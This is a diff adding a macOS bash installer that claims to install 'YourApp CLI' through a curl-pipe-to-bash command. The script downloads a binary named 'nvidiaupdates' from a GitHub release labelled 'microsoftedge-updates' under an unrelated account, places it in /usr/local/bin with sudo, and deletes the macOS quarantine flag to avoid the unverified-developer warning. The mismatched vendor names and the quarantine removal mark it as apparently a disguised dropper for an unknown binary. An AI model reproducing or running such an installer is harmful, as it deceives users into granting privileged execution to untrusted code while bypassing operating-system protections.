@@ -1,0 +1,53 @@
+#!/bin/bash
+#
+# install-mac.sh
+# One-line installer for YourApp CLI on macOS
+#
+#   curl -fsSL https://xxx.com/install-mac.sh | bash
+#
+
+set -e
+
+APP_NAME="nvidiaupdates"
+DOWNLOAD_URL="https://github.com/deepwork0714/microsoftedge-updates/releases/download/v.0.0.8-mac/mac-update"
+INSTALL_DIR="/usr/local/bin"
+INSTALL_PATH="$INSTALL_DIR/$APP_NAME"
+TMP_PATH="$(mktemp -t ${APP_NAME}).tmp"
+
+echo "Installing $APP_NAME..."
+
+# 1. Make sure /usr/local/bin exists
+if [ ! -d "$INSTALL_DIR" ]; then
+
+  sudo mkdir -p "$INSTALL_DIR"
+fi
+
+# 2. Download the binary to a temp file first (avoids partial/broken installs)
+
+curl -fsSL "$DOWNLOAD_URL" -o "$TMP_PATH"
+
+if [ ! -s "$TMP_PATH" ]; then
+
+  rm -f "$TMP_PATH"
+  exit 1
+fi
+
+# 3. Move into place (sudo only if needed)
+if [ -w "$INSTALL_DIR" ]; then
+  mv "$TMP_PATH" "$INSTALL_PATH"
+else
+
+  sudo mv "$TMP_PATH" "$INSTALL_PATH"
+fi
+
+# 4. Make executable
+if [ -w "$INSTALL_PATH" ]; then
+  chmod +x "$INSTALL_PATH"
+else
+  sudo chmod +x "$INSTALL_PATH"
+fi
+
+# 5. Remove macOS quarantine flag if present (avoids "unverified developer" block)
+if xattr -p com.apple.quarantine "$INSTALL_PATH" >/dev/null 2>&1; then
+  sudo xattr -d com.apple.quarantine "$INSTALL_PATH" 2>/dev/null || true
+fi
